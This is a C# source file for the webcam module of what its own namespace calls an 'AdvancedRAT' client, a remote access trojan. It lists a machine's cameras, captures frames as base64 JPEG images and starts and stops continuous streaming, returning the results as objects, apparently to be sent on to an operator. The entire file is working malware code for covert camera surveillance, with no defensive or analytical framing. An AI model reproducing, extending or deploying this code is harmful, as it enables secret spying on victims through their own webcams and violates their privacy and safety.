using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Threading.Tasks;
using System.Collections.Generic;
using AForge.Video;
using AForge.Video.DirectShow;

namespace AdvancedRAT.Client.Handlers
{
    public class WebcamHandler
    {
        private FilterInfoCollection videoDevices;
        private VideoCaptureDevice videoSource;
        private Bitmap lastFrame;
        
        public async Task<object> GetWebcamList()
        {
            try
            {
                videoDevices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
                var devices = new List<object>();
                
                for (int i = 0; i < videoDevices.Count; i++)
                {
                    devices.Add(new
                    {
                        index = i,
                        name = videoDevices[i].Name,
                        moniker = videoDevices[i].MonikerString
                    });
                }
                
                return new { success = true, devices };
            }
            catch (Exception ex)
            {
                return new { success = false, message = ex.Message };
            }
        }
        
        public async Task<object> CaptureImage(int deviceIndex)
        {
            try
            {
                if (videoDevices == null || deviceIndex >= videoDevices.Count)
                {
                    return new { success = false, message = "Invalid device index" };
                }
                
                videoSource = new VideoCaptureDevice(videoDevices[deviceIndex].MonikerString);
                
                var tcs = new TaskCompletionSource<object>();
                
                videoSource.NewFrame += (sender, eventArgs) =>
                {
                    lastFrame = (Bitmap)eventArgs.Frame.Clone();
                    videoSource.SignalToStop();
                    
                    using (MemoryStream ms = new MemoryStream())
                    {
                        lastFrame.Save(ms, ImageFormat.Jpeg);
                        byte[] imageBytes = ms.ToArray();
                        string base64 = Convert.ToBase64String(imageBytes);
                        
                        tcs.SetResult(new
                        {
                            success = true,
                            image = base64,
                            width = lastFrame.Width,
                            height = lastFrame.Height,
                            size = imageBytes.Length
                        });
                    }
                };
                
                videoSource.Start();
                
                return await tcs.Task;
            }
            catch (Exception ex)
            {
                return new { success = false, message = ex.Message };
            }
        }
        
        public async Task<object> StartStreaming(int deviceIndex)
        {
            try
            {
                if (videoDevices == null || deviceIndex >= videoDevices.Count)
                {
                    return new { success = false, message = "Invalid device index" };
                }
                
                videoSource = new VideoCaptureDevice(videoDevices[deviceIndex].MonikerString);
                
                videoSource.NewFrame += (sender, eventArgs) =>
                {
                    lastFrame = (Bitmap)eventArgs.Frame.Clone();
                };
                
                videoSource.Start();
                
                return new { success = true, message = "Webcam streaming started" };
            }
            catch (Exception ex)
            {
                return new { success = false, message = ex.Message };
            }
        }
        
        public async Task<object> StopStreaming()
        {
            try
            {
                if (videoSource != null && videoSource.IsRunning)
                {
                    videoSource.SignalToStop();
                    videoSource.WaitForStop();
                    return new { success = true, message = "Webcam streaming stopped" };
                }
                
                return new { success = false, message = "Not streaming" };
            }
            catch (Exception ex)
            {
                return new { success = false, message = ex.Message };
            }
        }
    }
}
